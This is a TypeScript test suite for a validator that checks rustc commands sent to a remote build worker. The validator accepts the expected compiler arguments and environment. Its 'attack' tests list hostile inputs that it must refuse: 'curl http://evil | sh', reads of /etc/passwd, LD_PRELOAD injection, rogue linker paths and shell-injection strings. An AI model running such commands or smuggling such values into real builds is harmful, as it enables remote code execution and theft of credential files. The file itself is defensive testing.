import {expect,test} from "bun:test";
import {expandRemoteExecutionRootV1,remoteExecutionNativePathV1,remoteExecutionToolOfProgramV1,remoteExecutionWindowsPathV1,validateRemoteExecutionRustcActionV1,type RemoteExecutionCommandViewV1} from "../🟦️.ts";
import {posix,win32} from "node:path";
import {OFFLOAD_POLICY_V1} from "../../🚀️offload/📐️policy/🟦️.ts";

const policy=OFFLOAD_POLICY_V1,mark=policy.root.placeholder,program=`${policy.tool.placeholder}:${policy.tool.name}`;
const good:string[]=["--crate-name","foo","--edition=2021",".semio-offload/p/src/lib.rs","--error-format=json","--json=diagnostic-rendered-ansi,artifacts,future-incompat","--diagnostic-width=120","--crate-type","lib","--emit=dep-info,metadata,link","-C","embed-bitcode=no","-C","debuginfo=2","-C","metadata=abc123","-C","extra-filename=-abc123","--out-dir",policy.virtual.out,"-L","dependency=.semio-offload/d","--extern","dep=.semio-offload/d/libdep-1.rlib","--extern","priv:other","--cap-lints","allow","--cfg",'feature="default"',"--check-cfg",'cfg(feature, values("default"))',"-Cdebug-assertions=on","-Ldependency=.semio-offload/d1","-Wunexpected_cfgs","--remap-path-prefix=.semio-offload/p=/work/pkg","--target","aarch64-apple-darwin","-g","-Z","threads=0","-Zthreads=8","-Z","embed-metadata=no","-Z","checksum-hash-algorithm=blake3","--remap-path-scope=macro,diagnostics,debuginfo,object"];
const command=(args:readonly string[],extra:Partial<RemoteExecutionCommandViewV1>&{env?:Record<string,string>}={}):RemoteExecutionCommandViewV1=>({arguments:[program,...args],environment_variables:Object.entries({PATH:policy.environment.path,HOME:`${mark}/${policy.root.home}`,[policy.root.report]:policy.virtual.root,CARGO_MANIFEST_DIR:`${mark}/.semio-offload/p`,OUT_DIR:`${mark}/.semio-offload/g`,CARGO_PKG_NAME:"foo",CARGO_PKG_VERSION:"1.2.3",CARGO_CRATE_NAME:"foo",...extra.env}).map(([name,value])=>({name,value})),output_paths:[policy.virtual.out,policy.virtual.root],working_directory:"",...extra});

test("the declared rustc action with the arguments the wrapper emits is accepted",()=>{
 expect(validateRemoteExecutionRustcActionV1(command(good))).toBeUndefined();
});

test("what the planner sends on the repository's real layouts passes the worker policy: the working-directory remap, the recorded source and the remap list, and the install name and object prefix of a macOS unit",()=>{
 const remaps=[`--remap-path-prefix=${mark}=.`,`--remap-path-prefix=${mark}/.semio-offload/p=./🧰️framework/🛍️products/📦️packages/🦀️rust`,`--remap-path-prefix=${mark}/.semio-offload/g=./out/build-script`];
 expect(validateRemoteExecutionRustcActionV1(command([...remaps,...good]))).toBeUndefined();
 expect(validateRemoteExecutionRustcActionV1(command([`--remap-path-prefix=${mark}=index.crates.io-1949cf8c6b5b557f/unicode-ident-1.0.27`,...good]))).toBeUndefined();
 const withoutSource=good.filter(item=>item!==".semio-offload/p/src/lib.rs");
 expect(validateRemoteExecutionRustcActionV1(command([...withoutSource,`${mark}/index.crates.io-1949cf8c6b5b557f/unicode-ident-1.0.27/src/lib.rs`])),"an absolute source travels below the root").toBeUndefined();
 expect(validateRemoteExecutionRustcActionV1(command([...good,`${mark}/src/lib.rs`])),"two sources").toBe("exactly one source file required");
 for(const crate of ["foo","t","x_y9"])expect(validateRemoteExecutionRustcActionV1(command([...good,"-Clink-arg=-Wl,-install_name,@rpath/lib"+crate+"-0a1b2c3d4e5f6071.dylib"])),crate).toBeUndefined();
 expect(validateRemoteExecutionRustcActionV1(command([...good,"-C","link-arg=-Wl,-install_name,@rpath/libfoo.dylib"]))).toBeUndefined();
 expect(validateRemoteExecutionRustcActionV1(command([...good,`-Clink-arg=-Wl,-oso_prefix,${mark}/${policy.virtual.out}/`]))).toBeUndefined();
});

test("attack: the root placeholder, the remaps and the object prefix are no way in: each is checked on its own",()=>{
 const refused=(view:RemoteExecutionCommandViewV1,why:string)=>expect(validateRemoteExecutionRustcActionV1(view),why).toBeString();
 const withoutSource=good.filter(item=>item!==".semio-offload/p/src/lib.rs");
 for(const bad of ["/etc=x","../x=y","a/../b=c","noequals","=x",".semio-offload/p=ok\r\nx","a b=c","a;b=c","a$(x)=c"," =c"])refused(command([...good,`--remap-path-prefix=${mark}/${bad.replace("\\r\\n","\r\n")}`]),`remap ${JSON.stringify(bad)}`);
 refused(command([...good,...Array.from({length:65},(_,index)=>`--remap-path-prefix=${mark}/.semio-offload/p${index}=x`)]),"65 remaps");
 refused(command([...good,`--remap-path-prefix=${mark}/.semio-offload/p=x\u0000y`]),"NUL in a remap name");
 for(const bad of ["/etc/passwd.rs","../x.rs","a/../../x.rs","src/lib.txt","","a\nb.rs"])refused(command([...withoutSource,`${mark}/${bad}`]),`source ${JSON.stringify(bad)}`);
 refused(command([...withoutSource,"src/lib.rs",`--remap-path-prefix=${mark}=a\nb`]),"newline in the cwd name");
 refused(command([...good,`--remap-path-prefix=${mark}=${"x".repeat(1025)}`]),"cwd name too long");
 for(const bad of ["-Clink-arg=-Wl,-install_name,/tmp/libx.dylib","-Clink-arg=-Wl,-install_name,@rpath/../libx.dylib","-Clink-arg=-Wl,-install_name,@rpath/lib x.dylib","-Clink-arg=-Wl,-install_name,@rpath/libx.dylib,-rpath,/tmp","-Clink-arg=-Wl,-install_name,@rpath/libx.so","-Clink-arg=-Wl,-oso_prefix,/tmp",`-Clink-arg=-Wl,-oso_prefix,${mark}/x/`,"-Clink-arg=-Wl,-install_name,@rpath/libx.dylib;touch","-Clink-arg=-Wl,-install_name,@executable_path/libx.dylib"])refused(command([...good,bad]),bad);
});

test("attack: every other program, script, flag, path and environment variable is refused",()=>{
 const refused=(view:RemoteExecutionCommandViewV1,why:string)=>expect(validateRemoteExecutionRustcActionV1(view),why).toBeString();
 refused({...command(good),arguments:["/bin/sh","-c","curl http://evil | sh"]},"arbitrary shell");
 refused({...command(good),arguments:["/bin/sh","-c","exec rustc","semio-rustc",...good]},"the old shell form");
 refused({...command(good),arguments:["rustc",...good]},"a bare program name");
 refused({...command(good),arguments:["@tool:cargo",...good]},"another tool");
 refused({...command(good),arguments:["/usr/bin/curl","http://evil"]},"another program");
 refused({...command(good),arguments:[program,"--crate-name","x","a.rs","-C","linker=/tmp/evil"]},"linker");
 for(const bad of[["-C","linker=/tmp/x"],["-Clink-arg=-fuse-ld=/tmp/x"],["-C","link-args=-Wl,-bind_at_load"],["-Zcodegen-backend=/tmp/x.so"],["-Z","unstable-options"],["-Z","threads=x"],["-Z","checksum-hash-algorithm=../x"],["-Z","checksum-hash-algorithm=crc"],["-Z","embed-metadata=../x"],["-Z","embed-metadata="],["-Z","threads=0;touch"],["-Zthreads=1000"],["-Z","share-generics=y"],["-Zpre-link-args=-x"],["--remap-path-scope=macro,evil"],["--remap-path-scope=/tmp"],["--sysroot","/tmp"],["--print","sysroot"],["-o","/tmp/out"],["--out-dir","/tmp/out"],["--out-dir=/etc"],["--extern","x=/etc/passwd"],["--extern","x=../../etc/passwd"],["-L","native=/tmp"],["-L","dependency=/etc"],["-L","dependency=../x"],["@/etc/passwd"],["--target","/tmp/evil.json"],["--target=evil.json"],["--emit=link=/tmp/x"],["--emit","asm=/tmp/x"],["-l","dylib=evil"],["--crate-type","cdylib-evil"],["--cfg","x\ny"],["--env-set","A=B"],["-C","llvm-args=-load=/tmp/x.so"],["-C","target-cpu=native;touch"],["--error-format","a b"],["-C","profile-use=/tmp/x"],["-C","ar=/tmp/x"],["-C","save-temps"],["--pretty=expanded"],["--unpretty=hir"],["-vV"],["--version"]]){
  const view=command([...good,...bad]);refused(view,bad.join(" "));
 }
 expect(validateRemoteExecutionRustcActionV1(command(good,{env:{CARGO_MANIFEST_DIR:`${mark}/.semio-offload/p/🧰️framework/🛍️products/🦑️repo/📦️packages/🦀️rust`}}))).toBeUndefined();
 refused(command([...good,"/etc/passwd.rs"]),"absolute source");
 refused(command([...good.filter(item=>item!==".semio-offload/p/src/lib.rs"),"../../x.rs"]),"escaping source");
 refused(command(good.filter(item=>item!==".semio-offload/p/src/lib.rs")),"no source");
 refused(command([...good,"other.rs"]),"two sources");
 for(const [name,value] of Object.entries({LD_PRELOAD:"/tmp/x.so",DYLD_INSERT_LIBRARIES:"/tmp/x.dylib",BASH_ENV:"/tmp/x",ENV:"/tmp/x",IFS:"/",RUSTC_BOOTSTRAP:"1",RUSTC_WRAPPER:"/tmp/x",RUSTFLAGS:"-Clinker=/tmp/x",SEMIO_EXTRA:"1",SEMIO_REMOTE_CACHE_TOKEN:"x",OUT_DIR:"/tmp",CARGO_MANIFEST_DIR:"/tmp",HOME:"/root",SEMIO_ROOT_REPORT:"x",TMPDIR:"/",PATH:"/tmp:/usr/bin",SEMIO_TOOL_RUSTC:"/bin/sh",SEMIO_ABSOLUTE:"CARGO_MANIFEST_DIR; touch x",SEMIO_REL_OUT_DIR:"../../x",SEMIO_REL_CARGO_MANIFEST_DIR:"/etc",CARGO_MANIFEST_PATH:"/etc/x"}))refused(command(good,{env:{[name]:value}}),`environment ${name}`);
 for(const bad of["a b","a$(touch x)","a`x`","a;b","a\"b","a'b","a\\b","a|b","a&b","a>b","a*b","a(b)","a{b}","a!b","a~b","a#b","a%b","a=b","a:b","a,b","x/../y","a\nb",""])refused(command(good,{env:{CARGO_MANIFEST_DIR:`${mark}/${bad}`}}),`manifest path ${JSON.stringify(bad)}`);
 refused({...command(good),output_paths:["/etc/x",policy.virtual.root]},"output path outside");
 refused({...command(good),output_paths:[policy.virtual.out]},"missing output path");
 refused({...command(good),working_directory:"/tmp"},"working directory");
 refused({...command(good),environment_variables:command(good).environment_variables.filter(row=>row.name!==policy.root.report)},"root report missing");
 refused({...command(good),environment_variables:[...command(good).environment_variables.filter(row=>row.name!=="HOME"),{name:"HOME",value:"/tmp"}]},"home outside the root");
});

test("cargo sets the CARGO_PKG_ variables from the manifest: a multi-line description, authors with colons and a long text are accepted, a NUL or a control byte in a loader name is not, and the live refusals (-C linker-plugin-lto, --check-cfg with values) are accepted",()=>{
 const env=(extra:Record<string,string>)=>validateRemoteExecutionRustcActionV1(command(good,{env:extra}));
 expect(env({CARGO_PKG_DESCRIPTION:"Zero-dependency tracing.\nSecond line, with \"quotes\", $dollar and `ticks`.\r\n\tTabbed",CARGO_PKG_AUTHORS:"A <a@b.c>:B",CARGO_PKG_NAME:"semio-framework-trace",CARGO_PKG_VERSION:"0.1.0",CARGO_PKG_VERSION_PRE:"",CARGO_PKG_REPOSITORY:"https://x.test/y"})).toBeUndefined();
 expect(env({CARGO_PKG_DESCRIPTION:"x".repeat(60000)})).toBeUndefined();
 expect(env({CARGO_PKG_DESCRIPTION:"x".repeat(70000)})).toBe("environment value of CARGO_PKG_DESCRIPTION");
 expect(env({CARGO_PKG_DESCRIPTION:"a\u0000b"})).toBe("environment value of CARGO_PKG_DESCRIPTION");
 expect(env({CARGOPKG_DESCRIPTION:"a\nb"}),"only the CARGO_PKG_ prefix may carry a newline").toBe("environment value of CARGOPKG_DESCRIPTION");
 expect(env({OTHER_TEXT:"a\nb"})).toBe("environment value of OTHER_TEXT");
 expect(env({CARGO_PKG_X:"a",LD_PRELOAD:"/tmp/x.so"}),"a CARGO_PKG_ variable is no way past the loader list").toBe("LD_PRELOAD is not allowed");
 for(const extra of[["-C","linker-plugin-lto"],["-Clinker-plugin-lto"],["--check-cfg","cfg(docsrs,test)"],["--check-cfg","cfg(feature, values(\"a\", \"b-c\", \"d_e\"))"],["--check-cfg=cfg(target_os, values(\"macos\"))"],["--check-cfg","cfg(feature, values(none()))"]])expect(validateRemoteExecutionRustcActionV1(command([...good,...extra])),extra.join(" ")).toBeUndefined();
});

test("an action path is relative POSIX and is mapped to the separators of the executing host: root placeholders expand at the start, after = and after a comma, and only there",()=>{
 expect(remoteExecutionNativePathV1("/w/r",".semio-offload/o/",posix)).toBe("/w/r/.semio-offload/o/");
 expect(remoteExecutionNativePathV1("/w/r","",posix)).toBe("/w/r");
 expect(remoteExecutionNativePathV1("/w/r",".",posix)).toBe("/w/r");
 expect(remoteExecutionNativePathV1("/w/r","a//b/./c",posix)).toBe("/w/r/a/b/c");
 const table:readonly (readonly [string,string,string])[]=[
  ["C:\\w\\r","a/b/c.rs","C:\\w\\r\\a\\b\\c.rs"],
  ["C:\\w\\r",".semio-offload/o/","C:\\w\\r\\.semio-offload\\o\\"],
  ["C:\\w\\r","","C:\\w\\r"],
  ["D:\\cache\\w\\r\\","x","D:\\cache\\w\\r\\x"],
  ["\\\\?\\C:\\w\\r","🦀️/lib.rs","\\\\?\\C:\\w\\r\\🦀️\\lib.rs"],
 ];
 for(const [root,path,expected] of table)expect(remoteExecutionWindowsPathV1(root,path),`${root} + ${path}`).toBe(expected);
 const windows={join:(...parts:string[])=>remoteExecutionWindowsPathV1(parts[0]!,parts.slice(1).join("/")),sep:"\\"};
 expect(expandRemoteExecutionRootV1("--remap-path-prefix=@root=name","C:\\w\\r",windows)).toBe("--remap-path-prefix=C:\\w\\r=name");
 expect(expandRemoteExecutionRootV1("--remap-path-prefix=@root/.semio-offload/p=./x","C:\\w\\r",windows)).toBe("--remap-path-prefix=C:\\w\\r\\.semio-offload\\p=./x");
 expect(expandRemoteExecutionRootV1("-Clink-arg=-Wl,-oso_prefix,@root/.semio-offload/o/","C:\\w\\r",windows)).toBe("-Clink-arg=-Wl,-oso_prefix,C:\\w\\r\\.semio-offload\\o\\");
 expect(expandRemoteExecutionRootV1("@root/src/lib.rs","/w/r",posix)).toBe("/w/r/src/lib.rs");
 expect(expandRemoteExecutionRootV1("@root","/w/r",posix)).toBe("/w/r");
 expect(expandRemoteExecutionRootV1("a@root/x","/w/r",posix),"not at a boundary").toBe("a@root/x");
 expect(expandRemoteExecutionRootV1("--cfg=feature=\"@rooted\"","/w/r",posix)).toBe("--cfg=feature=\"@rooted\"");
 expect(remoteExecutionToolOfProgramV1("@tool:rustc")).toBe("rustc");
 expect(remoteExecutionToolOfProgramV1("@tool:")).toBeUndefined();
 expect(remoteExecutionToolOfProgramV1("/bin/sh")).toBeUndefined();
});

test("the worker's native flavour gives one separator style: a win32 root and a posix action path expand to C:\\r\\root\\a\\b\\c.rs, never a mixed spelling, in arguments and in whole-value environment values",()=>{
 const windows={join:win32.join,sep:win32.sep};
 expect(expandRemoteExecutionRootV1(`${mark}/a/b/c.rs`,"C:\\r\\root",windows)).toBe("C:\\r\\root\\a\\b\\c.rs");
 expect(expandRemoteExecutionRootV1(`--out-dir=${mark}/.semio-offload/o`,"C:\\r\\root",windows)).toBe("--out-dir=C:\\r\\root\\.semio-offload\\o");
 expect(expandRemoteExecutionRootV1(`-Lx=${mark}/d`,"C:\\r\\root",windows),"after = of any flag").toBe("-Lx=C:\\r\\root\\d");
 expect(expandRemoteExecutionRootV1(`${mark}`,"C:\\r\\root",windows)).toBe("C:\\r\\root");
});

test("a root path ends at a comma: two placeholders in one argument both expand, and every placeholder is validated on its own",()=>{
 expect(expandRemoteExecutionRootV1(`${mark}/a,${mark}/b`,"/w/r",posix)).toBe("/w/r/a,/w/r/b");
 expect(expandRemoteExecutionRootV1(`-Clink-arg=-Wl,-oso_prefix,${mark}/.semio-offload/o/`,"/w/r",posix)).toBe("-Clink-arg=-Wl,-oso_prefix,/w/r/.semio-offload/o/");
 const view=(extra:string[])=>validateRemoteExecutionRustcActionV1(command([...good,...extra]));
 expect(view([`--json=${mark}/ok,${mark}/../x`]),"second placeholder escapes").toBeString();
 expect(view([`--error-format=${mark}/../../etc`])).toBeString();
});

test("every environment value with a root placeholder is a clean whole-value path below the root, wherever the variable comes from",()=>{
 const refused=(env:Record<string,string>)=>expect(validateRemoteExecutionRustcActionV1(command(good,{env})),JSON.stringify(env)).toBeString();
 refused({OTHER:`${mark}/../../etc`});refused({OTHER:`x=${mark}/a`});refused({OTHER:`${mark}/a ${mark}/b`});refused({OTHER:`${mark}\\..\\x`});refused({CARGO_MANIFEST_DIR:`${mark}/../x`});refused({OTHER:`${mark}x`});
 expect(validateRemoteExecutionRustcActionV1(command(good,{env:{OTHER:`${mark}/ok/dir`}}))).toBeUndefined();
 expect(validateRemoteExecutionRustcActionV1(command(good,{env:{CARGO_PKG_DESCRIPTION:`mail @root/../x`}})),"package text is text").toBeUndefined();
});

test("backslash, drive and verbatim forms are no relative paths: sources, -L and --extern take the same strict check as remaps",()=>{
 const refused=(extra:string[])=>expect(validateRemoteExecutionRustcActionV1(command([...good.filter(item=>item!==".semio-offload/p/src/lib.rs"),...extra])),extra.join(" ")).toBeString();
 for(const bad of ["\\\\?\\C:\\x.rs","a:stream.rs","C:/x.rs","a\\b.rs","\\x.rs","sp ace.rs","a;b.rs"])refused([bad]);
 for(const bad of ["dependency=C:\\d","dependency=a\\b","dependency=a b","dependency=a:b"])refused([".semio-offload/p/src/lib.rs","-L",bad]);
 for(const bad of ["x=a\\b.rlib","x=C:/a.rlib","x=a:b.rlib"])refused([".semio-offload/p/src/lib.rs","--extern",bad]);
});
